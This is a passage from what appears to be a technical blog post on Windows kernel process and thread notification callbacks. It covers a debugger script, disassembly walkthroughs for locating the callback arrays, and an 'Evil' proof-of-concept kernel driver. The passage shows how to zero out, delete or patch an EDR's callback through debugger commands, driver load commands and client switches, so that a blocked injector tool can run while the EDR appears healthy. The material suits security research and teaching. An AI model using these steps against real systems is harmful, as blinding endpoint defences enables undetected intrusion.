+    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[-] Couldn&#39;t not read memory and/or load Symbols&#34;</span>)
+    <span style="color:#fff;font-weight:bold">exit</span>(<span style="color:#ff0;font-weight:bold">1</span>)
+
+  <span style="color:#fff;font-weight:bold">if</span> version.buildNumber &gt;= <span style="color:#ff0;font-weight:bold">10240</span>:
+  	num = PspCreateThreadNotifyRoutineCount + ptrDWord(nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspCreateThreadNotifyRoutineNonSystemCount&#34;</span>))
+  <span style="color:#fff;font-weight:bold">else</span>:
+    num = PspCreateThreadNotifyRoutineCount
+  <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">[+] Total of: {} CreateThreadNotifyRoutines&#34;</span>.format(num))
+  listCallbacks(PspCreateThreadNotifyRoutine, num)
+
+<span style="color:#fff;font-weight:bold">def</span> loadimageCallbacks(nt):
+  <span style="color:#fff;font-weight:bold">try</span>:
+    <span style="color:#007f7f"># read counters</span>
+    PspLoadImageNotifyRoutineCount = ptrDWord(nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspLoadImageNotifyRoutineCount&#34;</span>))
+    <span style="color:#007f7f"># get the address of the symbol PspLoadImageNotifyRoutine</span>
+    PspLoadImageNotifyRoutine = nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspLoadImageNotifyRoutine&#34;</span>)
+  <span style="color:#fff;font-weight:bold">except</span>:
+    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[-] Couldn&#39;t not read memory and/or load Symbols&#34;</span>)
+    <span style="color:#fff;font-weight:bold">exit</span>(<span style="color:#ff0;font-weight:bold">1</span>)
+
+  num = PspLoadImageNotifyRoutineCount
+  <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">[+] Total of: {} CreateLoadImageRoutines&#34;</span>.format(num))
+  listCallbacks(PspLoadImageNotifyRoutine, num)
+
+<span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#39;__main__&#39;</span>:
+  checkKernelDebugging()
+  nt = loadNT()
+  processCallbacks(nt)
+  threadCallbacks(nt)
+  loadimageCallbacks(nt)
+</code></pre></div><p>To run it:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">1: kd&gt; .load pykd
+1: kd&gt; !py C:\Users\rui\desktop\tools\windbg-scripts\psnotifycallbacks.py
+</code></pre></div><p>Here&rsquo;s the output of its execution on my system.</p>
+<p><img src="/callbacks/windbg002.png" alt=""></p>
+<h4 id="swishdbgext">SwishDbgExt</h4>
+<p>You can also use the <a href="https://github.com/comaeio/SwishDbgExt">SwishDbgExt</a> WinDbg extension, which is pretty cool and will give you way more information. Just use the command <code>!ms_callbacks</code>, see below.</p>
+<p><img src="/callbacks/windbg003.png" alt=""></p>
+<p>If you fancy colours and buttons, use <code>windbg</code> instead of <code>kd</code> as above.</p>
+<h3 id="the-pspcreateprocessnotifyroutine-array">The PspCreateProcessNotifyRoutine array</h3>
+<p>The scripts above are all cool and pretty, but let&rsquo;s see how to find this information &ldquo;manually&rdquo; without the help of these scripts. I advise you to read the code of the scripts above, because in the end what we&rsquo;ll do step by step here, is what the scripts are doing with some extra lifting and error handling. We are going through this &ldquo;manually&rdquo; mainly because you&rsquo;ll need to understand it if you later want to modify the source code of the <code>Evil.sys</code> kernel driver (that we&rsquo;ll talk about further down).</p>
+<p>In this walkthrough, we&rsquo;ll be using, as mentioned already, Windows 10 x64 1903 19H1 (OS Build 18362.592). I won&rsquo;t mention 32-bit systems or other Windows versions below 10. You can look at them yourself if you like. I can tell you in advance that the process to identify these global arrays (<code>PspCreateProcessNotifyRoutine</code>, and <code>PspCreateThreadNotifyRoutine</code>) is easier.</p>
+<p>We start by disassembling the function <code>PsSetCreateProcessNotifyRoutine</code>.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; u nt!PsSetCreateProcessNotifyRoutine
+nt!PsSetCreateProcessNotifyRoutine:
+fffff800`26f48b60 4883ec28        sub     rsp,28h
+fffff800`26f48b64 8ac2            mov     al,dl
+fffff800`26f48b66 33d2            xor     edx,edx
+fffff800`26f48b68 84c0            test    al,al
+fffff800`26f48b6a 0f95c2          setne   dl
+fffff800`26f48b6d e80e010000      call    nt!PspSetCreateProcessNotifyRoutine (fffff800`26f48c80)
+fffff800`26f48b72 4883c428        add     rsp,28h
+fffff800`26f48b76 c3              ret
+</code></pre></div><p>Above, we can get the address of the function <code>PspSetCreateProcessNotifyRoutine</code>. So we disassemble it too.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; u nt!PspSetCreateProcessNotifyRoutine 
+nt!PspSetCreateProcessNotifyRoutine:
+fffff800`26f48c80 48895c2408      mov     qword ptr [rsp+8],rbx
+fffff800`26f48c85 48896c2410      mov     qword ptr [rsp+10h],rbp
+fffff800`26f48c8a 4889742418      mov     qword ptr [rsp+18h],rsi
+fffff800`26f48c8f 57              push    rdi
+fffff800`26f48c90 4154            push    r12
+fffff800`26f48c92 4155            push    r13
+fffff800`26f48c94 4156            push    r14
+fffff800`26f48c96 4157            push    r15
+0: kd&gt; u
+nt!PspSetCreateProcessNotifyRoutine+0x18:
+fffff800`26f48c98 4883ec20        sub     rsp,20h
+fffff800`26f48c9c 8bf2            mov     esi,edx
+fffff800`26f48c9e 8bda            mov     ebx,edx
+fffff800`26f48ca0 83e602          and     esi,2
+fffff800`26f48ca3 4c8bf1          mov     r14,rcx
+fffff800`26f48ca6 f6c201          test    dl,1
+fffff800`26f48ca9 0f8591520c00    jne     nt!PspSetCreateProcessNotifyRoutine+0xc52c0 (fffff800`2700df40)
+fffff800`26f48caf 85f6            test    esi,esi
+0: kd&gt; u
+nt!PspSetCreateProcessNotifyRoutine+0x31:
+fffff800`26f48cb1 0f848c000000    je      nt!PspSetCreateProcessNotifyRoutine+0xc3 (fffff800`26f48d43)
+fffff800`26f48cb7 ba20000000      mov     edx,20h
+fffff800`26f48cbc e89f82a3ff      call    nt!MmVerifyCallbackFunctionCheckFlags (fffff800`26980f60)
+fffff800`26f48cc1 85c0            test    eax,eax
+fffff800`26f48cc3 0f843a530c00    je      nt!PspSetCreateProcessNotifyRoutine+0xc5383 (fffff800`2700e003)
+fffff800`26f48cc9 488bd3          mov     rdx,rbx
+fffff800`26f48ccc 498bce          mov     rcx,r14
+fffff800`26f48ccf e8a4000000      call    nt!ExAllocateCallBack (fffff800`26f48d78)
+0: kd&gt; u
+nt!PspSetCreateProcessNotifyRoutine+0x54:
+fffff800`26f48cd4 488bf8          mov     rdi,rax
+fffff800`26f48cd7 4885c0          test    rax,rax
+fffff800`26f48cda 0f842d530c00    je      nt!PspSetCreateProcessNotifyRoutine+0xc538d (fffff800`2700e00d)
+fffff800`26f48ce0 33db            xor     ebx,ebx
+fffff800`26f48ce2 4c8d2d77d3dbff  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff800`26d06060)]
+fffff800`26f48ce9 488d0cdd00000000 lea     rcx,[rbx*8]
+fffff800`26f48cf1 4533c0          xor     r8d,r8d
+fffff800`26f48cf4 4903cd          add     rcx,r13
+</code></pre></div><p>Once we see the <a href="https://www.felixcloutier.com/x86/lea">lea</a> instruction for the first time we <strong>found the global array</strong> we are interested in (<code>PspCreateProcessNotifyRoutine</code>). In this Windows version, the address is loaded into the register <code>R13</code>. If you look into other Windows versions you can see it being loaded into <code>R14</code>, <code>R15</code>, or others. The same goes for the initial <code>call</code> that led us to the <code>PspSetCreateProcessNotifyRoutine</code>. In some Windows versions, you might find a <code>jmp</code> instead. We&rsquo;ll need to handle these cases in our <code>Evil</code> driver.</p>
+<p>Note: Since these are only a few opcodes we need to parse to find the instructions we are interested in, doing it manually it&rsquo;s ok. If you want to do it properly look at <a href="http://www.capstone-engine.org/">Capstone</a> or <a href="https://zydis.re/">Zydis</a>.</p>
+<p>If we now display the contents of the array&hellip;</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; dqs fffff800`26d06060
+fffff800`26d06060  ffffcd0b`e2c5024f
+fffff800`26d06068  ffffcd0b`e2dea2af
+fffff800`26d06070  ffffcd0b`e486525f
+fffff800`26d06078  ffffcd0b`e4865c1f
+fffff800`26d06080  ffffcd0b`e486ccff
+fffff800`26d06088  ffffcd0b`e486caef
+fffff800`26d06090  ffffcd0b`e486d59f
+fffff800`26d06098  ffffcd0b`e7722c1f
+fffff800`26d060a0  ffffcd0b`e772696f
+fffff800`26d060a8  ffffcd0b`e9e8a1cf
+fffff800`26d060b0  00000000`00000000
+fffff800`26d060b8  00000000`00000000
+</code></pre></div><p>Hmm, no symbols resolution? To get the actual address of the notification routines we need to <code>AND</code> the values we have in the array with <code>0xFFFFFFFFFFFFFFF8</code>. For example, for the last value of the array:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; dps (ffffcd0b`e9e8a1cf &amp; FFFFFFFFFFFFFFF8) L1
+ffffcd0b`e9e8a1c8  fffff800`2c821720 edr!OnProcessNotify [c:\users\rui\source\repos\edr\edr\edr.cpp @ 158]
+</code></pre></div><p>For now, that&rsquo;s all we need to know. We&rsquo;ll talk about these &ldquo;signatures&rdquo;, that we have to parse in our Evil driver to find the kernel structures we are interested, further down.</p>
+<h3 id="the-pspcreatethreadnotifyroutine-array">The PspCreateThreadNotifyRoutine array</h3>
+<p>The process to find the <code>PspCreateThreadNotifyRoutine</code> is pretty much the same as for <code>PspCreateProcessNotifyRoutine</code>. Since our proof-of-concept Evil driver doesn&rsquo;t care about threads I&rsquo;ll just list here the <code>kd</code> output for the same Windows version as described above.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; u nt!PsSetCreateThreadNotifyRoutine
+nt!PsSetCreateThreadNotifyRoutine:
+fffff806`4c748940 4883ec28        sub     rsp,28h
+fffff806`4c748944 33d2            xor     edx,edx
+fffff806`4c748946 e865000000      call    nt!PspSetCreateThreadNotifyRoutine (fffff806`4c7489b0)
+fffff806`4c74894b 4883c428        add     rsp,28h
+fffff806`4c74894f c3              ret
+fffff806`4c748950 cc              int     3
+fffff806`4c748951 cc              int     3
+fffff806`4c748952 cc              int     3
+0: kd&gt; u nt!PspSetCreateThreadNotifyRoutine
+nt!PspSetCreateThreadNotifyRoutine:
+fffff806`4c7489b0 48895c2408      mov     qword ptr [rsp+8],rbx
+fffff806`4c7489b5 4889742410      mov     qword ptr [rsp+10h],rsi
+fffff806`4c7489ba 57              push    rdi
+fffff806`4c7489bb 4883ec20        sub     rsp,20h
+fffff806`4c7489bf 8bf2            mov     esi,edx
+fffff806`4c7489c1 8bd2            mov     edx,edx
+fffff806`4c7489c3 e8b0030000      call    nt!ExAllocateCallBack (fffff806`4c748d78)
+fffff806`4c7489c8 488bf8          mov     rdi,rax
+0: kd&gt; u
+nt!PspSetCreateThreadNotifyRoutine+0x1b:
+fffff806`4c7489cb 4885c0          test    rax,rax
+fffff806`4c7489ce 0f840e550c00    je      nt!PspSetCreateThreadNotifyRoutine+0xc5532 (fffff806`4c80dee2)
+fffff806`4c7489d4 33db            xor     ebx,ebx
+fffff806`4c7489d6 488d0d83d2dbff  lea     rcx,[nt!PspCreateThreadNotifyRoutine (fffff806`4c505c60)]
+fffff806`4c7489dd 4533c0          xor     r8d,r8d
+fffff806`4c7489e0 488d0cd9        lea     rcx,[rcx+rbx*8]
+fffff806`4c7489e4 488bd7          mov     rdx,rdi
+fffff806`4c7489e7 e8b084a3ff      call    nt!ExCompareExchangeCallBack (fffff806`4c180e9c)
+</code></pre></div><p>We decode the function addresses the same way.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; dqs fffff806`4c505c60
+fffff806`4c505c60  ffff8882`ac745c8f
+fffff806`4c505c68  ffff8882`ac702a0f
+fffff806`4c505c70  00000000`00000000
+fffff806`4c505c78  00000000`00000000
+(...)
+0: kd&gt; dps (ffff8882`ac702a0f &amp; FFFFFFFFFFFFFFF8) L1
+ffff8882`ac702a08  fffff806`52481a20 edr!OnThreadNotify
+</code></pre></div><p>As I said in the beginning, and as you can see, all these Ps notify callbacks &ldquo;work&rdquo; more or less the same way.</p>
+<h2 id="evil-kernel-mode-driver">Evil Kernel Mode Driver</h2>
+<p>What&rsquo;s this <code>Evil</code> kernel driver about after all? We asked ourselves before what happens if we zero out these global arrays where the addresses of our notification callbacks are stored. Also, we said that if we can set notification callbacks we can also unset them. Right?</p>
+<p>Right. We can simply try it with the debugger. We don&rsquo;t need to write a kernel driver to find out. For example, if we want to zero out the entry for our EDR we can simply do:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; dqs fffff800`26d06060
+fffff800`26d06060  ffffcd0b`e2c5024f
+fffff800`26d06068  ffffcd0b`e2dea2af
+fffff800`26d06070  ffffcd0b`e486525f
+fffff800`26d06078  ffffcd0b`e4865c1f
+fffff800`26d06080  ffffcd0b`e486ccff
+fffff800`26d06088  ffffcd0b`e486caef
+fffff800`26d06090  ffffcd0b`e486d59f
+fffff800`26d06098  ffffcd0b`e7722c1f
+fffff800`26d060a0  ffffcd0b`e772696f
+fffff800`26d060a8  ffffcd0b`e9e8a1cf
+fffff800`26d060b0  00000000`00000000
+0: kd&gt; eq fffff800`26d060a8 0
+0: kd&gt; dqs fffff800`26d06060
+fffff800`26d06060  ffffcd0b`e2c5024f
+fffff800`26d06068  ffffcd0b`e2dea2af
+fffff800`26d06070  ffffcd0b`e486525f
+fffff800`26d06078  ffffcd0b`e4865c1f
+fffff800`26d06080  ffffcd0b`e486ccff
+fffff800`26d06088  ffffcd0b`e486caef
+fffff800`26d06090  ffffcd0b`e486d59f
+fffff800`26d06098  ffffcd0b`e7722c1f
+fffff800`26d060a0  ffffcd0b`e772696f
+fffff800`26d060a8  00000000`00000000
+fffff800`26d060b0  00000000`00000000
+</code></pre></div><p>As simple as that. And from now on&hellip; our EDR won&rsquo;t receive anymore process creation/termination notifications. From an attacker perspective, using <code>kd</code> is not realistic in an attack scenario for many obvious reasons.</p>
+<p>What if we have a kernel driver that does exactly this for us, and few other things more? Let&rsquo;s see what&rsquo;s this <code>Evil</code> driver is about. Build the driver with Debug mode enabled, load it with <code>sc.exe</code>, and run its user-mode client too to find out which options are available.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sc create evil type= kernel binPath= c:\users\rui\desktop\evil.sys
+sc start evil
+</code></pre></div><p><img src="/callbacks/evil001.png" alt=""></p>
+<p>As we can see from above, there are multiple things we can do with the <code>Evil</code> driver user-mode client.</p>
+<ul>
+<li>list all the notification callbacks registered on the system for process creation/termination</li>
+<li>zero out the array, basically what we did with <code>kd</code> above (let&rsquo;s call it Cowboy Mode)</li>
+<li>unset these notification callbacks (Red Team Mode)</li>
+<li>patch these notification callbacks (Threat Actor Mode)</li>
+</ul>
+<p>These &ldquo;special&rdquo; modes are just parody, but let&rsquo;s go through each one of them.</p>
+<p>First, we use our <code>Evil</code> driver user-mode client to list all the process creation/termination notification callbacks registered in the system.</p>
+<p><img src="/callbacks/evil002.png" alt=""></p>
+<p>How is this achieved? I use the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/aux_klib/nf-aux_klib-auxklibquerymoduleinformation">AuxKlibQueryModuleInformation</a> to retrieve information about all the image modules that the system has loaded. You can have a look at the function <code>SearchModules</code> inside the <code>evil.cpp</code> file. It&rsquo;s a slightly modified version of the <code>DisplayModules</code> function that you can find on the same file. You can also call this <code>DisplayModules</code> function from the <code>evilcli.exe</code> with the &ldquo;undocumented&rdquo; <code>-m</code> switch.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">NTSTATUS DisplayModules()
+{
+	<span style="color:#fff;font-weight:bold">auto</span> status = STATUS_SUCCESS;
+	ULONG  modulesSize;
+	AUX_MODULE_EXTENDED_INFO* modules;
+	ULONG  numberOfModules, i;
+
+	status = AuxKlibInitialize();
+	<span style="color:#fff;font-weight:bold">if</span> (!NT_SUCCESS(status))
+	{
+		KdPrint((<span style="color:#0ff;font-weight:bold">&#34;AuxKlibInitialize fail %d</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, status));
+		<span style="color:#fff;font-weight:bold">return</span> status;
+	}
+
+	status = AuxKlibQueryModuleInformation(&amp;modulesSize, <span style="color:#fff;font-weight:bold">sizeof</span>(AUX_MODULE_EXTENDED_INFO), <span style="color:#fff;font-weight:bold">NULL</span>);<span style="color:#007f7f">// Get the required array size.
+</span><span style="color:#007f7f"></span>	<span style="color:#fff;font-weight:bold">if</span> (!NT_SUCCESS(status) || modulesSize == <span style="color:#ff0;font-weight:bold">0</span>) {
+		<span style="color:#fff;font-weight:bold">return</span> status;
+	}
+
+	numberOfModules = modulesSize / <span style="color:#fff;font-weight:bold">sizeof</span>(AUX_MODULE_EXTENDED_INFO);<span style="color:#007f7f">// Calculate the number of modules.
+</span><span style="color:#007f7f"></span>
+	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);<span style="color:#007f7f">// Allocate memory to receive data.
+</span><span style="color:#007f7f"></span>	<span style="color:#fff;font-weight:bold">if</span> (modules == <span style="color:#fff;font-weight:bold">NULL</span>) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		<span style="color:#fff;font-weight:bold">return</span> status;
+	}
+	RtlZeroMemory(modules, modulesSize);
+
+	status = AuxKlibQueryModuleInformation(&amp;modulesSize, <span style="color:#fff;font-weight:bold">sizeof</span>(AUX_MODULE_EXTENDED_INFO), modules);<span style="color:#007f7f">// Obtain the module information.
+</span><span style="color:#007f7f"></span>	<span style="color:#fff;font-weight:bold">if</span> (!NT_SUCCESS(status)) {
+		ExFreePoolWithTag(modules, DRIVER_TAG);
+		<span style="color:#fff;font-weight:bold">return</span> status;
+	}
+
+	KdPrint((<span style="color:#0ff;font-weight:bold">&#34;[ # ] ImageBase</span><span style="color:#0ff;font-weight:bold">\t\t\t</span><span style="color:#0ff;font-weight:bold">ImageSize</span><span style="color:#0ff;font-weight:bold">\t\t\t\t\t\t</span><span style="color:#0ff;font-weight:bold">  FileName  FullPathName</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>));
+	<span style="color:#fff;font-weight:bold">for</span> (i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; numberOfModules; i++)
+	{
+		KdPrint((<span style="color:#0ff;font-weight:bold">&#34;[%03d] %p</span><span style="color:#0ff;font-weight:bold">\t</span><span style="color:#0ff;font-weight:bold">&#34;</span>, i, modules[i].BasicInfo.ImageBase)); <span style="color:#007f7f">// ImageBase
+</span><span style="color:#007f7f"></span>		KdPrint((<span style="color:#0ff;font-weight:bold">&#34;0x%08x</span><span style="color:#0ff;font-weight:bold">\t</span><span style="color:#0ff;font-weight:bold">&#34;</span>, modules[i].ImageSize)); <span style="color:#007f7f">// ImageSize
+</span><span style="color:#007f7f"></span>		KdPrint((<span style="color:#0ff;font-weight:bold">&#34;%30s &#34;</span>, modules[i].FullPathName + modules[i].FileNameOffset)); <span style="color:#007f7f">// FileName
+</span><span style="color:#007f7f"></span>		KdPrint((<span style="color:#0ff;font-weight:bold">&#34; %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, modules[i].FullPathName)); <span style="color:#007f7f">// FullPathName
+</span><span style="color:#007f7f"></span>	}
+
+	ExFreePoolWithTag(modules, DRIVER_TAG);
+
+	<span style="color:#fff;font-weight:bold">return</span> status;
+}
+</code></pre></div><p>If you use the <code>-m</code> switch (<code>evilcli.exe -m</code>) you won&rsquo;t see the output in user-mode (there are other ways of getting the same information from a medium integrity process as we&rsquo;ll see later). However, if you have your kernel debugger attached you&rsquo;ll see the following.</p>
+<p><img src="/callbacks/evil003.png" alt=""></p>
+<p>This <code>-m</code> switch is just for my own debugging. However, you can see that with this information at hand it&rsquo;s trivial to find out at which module each one of the global array values belongs. Look at the <code>SearchModules</code> function for details.</p>
+<p>Let&rsquo;s look at the <code>-z</code> switch now. <strong>Zero out Process Notify Callback&rsquo;s Array (Cowboy Mode)</strong>. Let&rsquo;s start by locating the array, as we did before.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; u nt!PsSetCreateProcessNotifyRoutine
+nt!PsSetCreateProcessNotifyRoutine:
+fffff806`4c748b60 4883ec28        sub     rsp,28h
+fffff806`4c748b64 8ac2            mov     al,dl
+fffff806`4c748b66 33d2            xor     edx,edx
+fffff806`4c748b68 84c0            test    al,al
+fffff806`4c748b6a 0f95c2          setne   dl
+fffff806`4c748b6d e80e010000      call    nt!PspSetCreateProcessNotifyRoutine (fffff806`4c748c80)
+fffff806`4c748b72 4883c428        add     rsp,28h
+fffff806`4c748b76 c3              ret
+0: kd&gt; u nt!PspSetCreateProcessNotifyRoutine
+nt!PspSetCreateProcessNotifyRoutine:
+fffff806`4c748c80 48895c2408      mov     qword ptr [rsp+8],rbx
+fffff806`4c748c85 48896c2410      mov     qword ptr [rsp+10h],rbp
+fffff806`4c748c8a 4889742418      mov     qword ptr [rsp+18h],rsi
+fffff806`4c748c8f 57              push    rdi
+fffff806`4c748c90 4154            push    r12
+fffff806`4c748c92 4155            push    r13
+fffff806`4c748c94 4156            push    r14
+fffff806`4c748c96 4157            push    r15
+0: kd&gt; u
+nt!PspSetCreateProcessNotifyRoutine+0x18:
+fffff806`4c748c98 4883ec20        sub     rsp,20h
+fffff806`4c748c9c 8bf2            mov     esi,edx
+fffff806`4c748c9e 8bda            mov     ebx,edx
+fffff806`4c748ca0 83e602          and     esi,2
+fffff806`4c748ca3 4c8bf1          mov     r14,rcx
+fffff806`4c748ca6 f6c201          test    dl,1
+fffff806`4c748ca9 0f8591520c00    jne     nt!PspSetCreateProcessNotifyRoutine+0xc52c0 (fffff806`4c80df40)
+fffff806`4c748caf 85f6            test    esi,esi
+0: kd&gt; u
+nt!PspSetCreateProcessNotifyRoutine+0x31:
+fffff806`4c748cb1 0f848c000000    je      nt!PspSetCreateProcessNotifyRoutine+0xc3 (fffff806`4c748d43)
+fffff806`4c748cb7 ba20000000      mov     edx,20h
+fffff806`4c748cbc e89f82a3ff      call    nt!MmVerifyCallbackFunctionCheckFlags (fffff806`4c180f60)
+fffff806`4c748cc1 85c0            test    eax,eax
+fffff806`4c748cc3 0f843a530c00    je      nt!PspSetCreateProcessNotifyRoutine+0xc5383 (fffff806`4c80e003)
+fffff806`4c748cc9 488bd3          mov     rdx,rbx
+fffff806`4c748ccc 498bce          mov     rcx,r14
+fffff806`4c748ccf e8a4000000      call    nt!ExAllocateCallBack (fffff806`4c748d78)
+0: kd&gt; u
+nt!PspSetCreateProcessNotifyRoutine+0x54:
+fffff806`4c748cd4 488bf8          mov     rdi,rax
+fffff806`4c748cd7 4885c0          test    rax,rax
+fffff806`4c748cda 0f842d530c00    je      nt!PspSetCreateProcessNotifyRoutine+0xc538d (fffff806`4c80e00d)
+fffff806`4c748ce0 33db            xor     ebx,ebx
+fffff806`4c748ce2 4c8d2d77d3dbff  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff806`4c506060)]
+fffff806`4c748ce9 488d0cdd00000000 lea     rcx,[rbx*8]
+fffff806`4c748cf1 4533c0          xor     r8d,r8d
+fffff806`4c748cf4 4903cd          add     rcx,r13
+0: kd&gt; dqs fffff806`4c506060
+fffff806`4c506060  ffff8882`a7c5006f
+fffff806`4c506068  ffff8882`a7e640ff
+fffff806`4c506070  ffff8882`a9b8a73f
+fffff806`4c506078  ffff8882`a9b8aaff
+fffff806`4c506080  ffff8882`a9b91abf
+fffff806`4c506088  ffff8882`a9b91c9f
+fffff806`4c506090  ffff8882`a9b92b0f
+fffff806`4c506098  ffff8882`a9b9562f
+fffff806`4c5060a0  ffff8882`ac745d1f
+fffff806`4c5060a8  ffff8882`ac702d0f
+fffff806`4c5060b0  00000000`00000000
+fffff806`4c5060b8  00000000`00000000
+fffff806`4c5060c0  00000000`00000000
+fffff806`4c5060c8  00000000`00000000
+fffff806`4c5060d0  00000000`00000000
+fffff806`4c5060d8  00000000`00000000
+</code></pre></div><p>So we have our array at <code>fffff8064c506060</code>. If we now run our <code>evilclient.exe</code> with the <code>-z</code> switch this array should be completely zero&rsquo;ed out.</p>
+<p><img src="/callbacks/evil004.png" alt=""></p>
+<p>We should see the following in our debugger.</p>
+<p><img src="/callbacks/evil005.png" alt=""></p>
+<p>These are just debug messages, but it means basically that we successfully found what we were looking for. The logic is implemented in the function <code>FindPspCreateProcessNotifyRoutine</code>, look at the source code. Again, if you want to do a proper job, use <a href="http://www.capstone-engine.org/">Capstone</a> or <a href="https://zydis.re/">Zydis</a> as I mentioned before. For a few instructions like in this case, it is fine to parse the memory ourselves and search for the opcodes we are interested in.</p>
+<p>Anyway, if we look at the array address again&hellip;</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; dqs fffff806`4c506060
+fffff806`4c506060  00000000`00000000
+fffff806`4c506068  00000000`00000000
+fffff806`4c506070  00000000`00000000
+fffff806`4c506078  00000000`00000000
+fffff806`4c506080  00000000`00000000
+fffff806`4c506088  00000000`00000000
+fffff806`4c506090  00000000`00000000
+fffff806`4c506098  00000000`00000000
+fffff806`4c5060a0  00000000`00000000
+fffff806`4c5060a8  00000000`00000000
+fffff806`4c5060b0  00000000`00000000
+fffff806`4c5060b8  00000000`00000000
+fffff806`4c5060c0  00000000`00000000
+fffff806`4c5060c8  00000000`00000000
+fffff806`4c5060d0  00000000`00000000
+fffff806`4c5060d8  00000000`00000000
+</code></pre></div><p>All zeros. This is quite intrusive and that&rsquo;s why I called it <em>Cowboy Mode</em>. Don&rsquo;t do this! All the other notification callbacks that were registered by other system components are gone. PatchGuard won&rsquo;t complain, because Windows Defender (<code>WdFilter.sys</code>) is disabled in my system. Otherwise touching it would have consequences.</p>
+<p>Note: If you want to know if PatchGuard will trigger after this change, you&rsquo;ll need a different VM. <strong>PatchGuard will not run if kernel debugging is enabled</strong>.</p>
+<p>Let&rsquo;s now look at the second option, <strong>Delete Specific Process Notify Callback (Red Team Mode)</strong>. This is much lesser intrusive and probably aligns with your &ldquo;mission&rdquo;. Silence the EDR, while it still runs and everyone believes that everything is fine. So what&rsquo;s the first thing to do? List all the process notify callbacks registered.</p>
+<p><img src="/callbacks/evil006.png" alt=""></p>
+<p>We locate our target, in this case <code>[09] 0xfffff807027b1720 (edr.sys + 0x1720)</code>. We want to remove it because at the moment it is blocking our favourite <code>h4x0r</code> tool (<code>injector.exe</code>).</p>
+<p><img src="/callbacks/evil007.png" alt=""></p>
+<p>Let&rsquo;s use the <code>-d</code> switch of our <code>evilcli.exe</code> and the index of the EDR (<code>09</code> as we can see above).</p>
+<p><img src="/callbacks/evil008.png" alt=""></p>
+<p>Let&rsquo;s now list the registered callbacks again and see if our EDR is indeed gone, and we can run our favourite <code>injector.exe</code> again.</p>
+<p><img src="/callbacks/evil009.png" alt=""></p>
+<p>We can. This is cool. However, what happens if you try to remove other registered callbacks? While you&rsquo;ll succeed for most of them, it will fail for some others. For example, here&rsquo;s what happens with <code>CI.dll</code>:</p>
+<p><img src="/callbacks/evil011.png" alt=""></p>
+<p>That was unexpected, right? After all, this is <code>ring0</code> vs <code>ring0</code>. Well, I invite you to play a bit with this and figure out yourself why this happens. It&rsquo;s not hard.</p>
+<p>Before we answer the questions you may have at this moment, let&rsquo;s look at the third option. <strong>Patch Specific Process Notify Callback (Threat Actor Mode)</strong>. Note that I didn&rsquo;t use the words &ldquo;Advanced&rdquo; (Threat Actor Mode), or &ldquo;State&rdquo; (Actor Mode). Why? Bear with me for a moment.</p>
+<p>This technique will simply patch the <code>OnProcessNotify</code> function from our EDR. Which means, we won&rsquo;t remove the callback. We&rsquo;ll leave it there, but every time it is executed (a new notification arrives) it will simply return. How?</p>
+<p>Let&rsquo;s look at the code before we run our <code>evilcli.exe</code> with the <code>-p</code> option.</p>
+<p>We have private symbols (that&rsquo;s why I told you, in the beginning, to build the drivers with debug information), so we can simply do:</p>
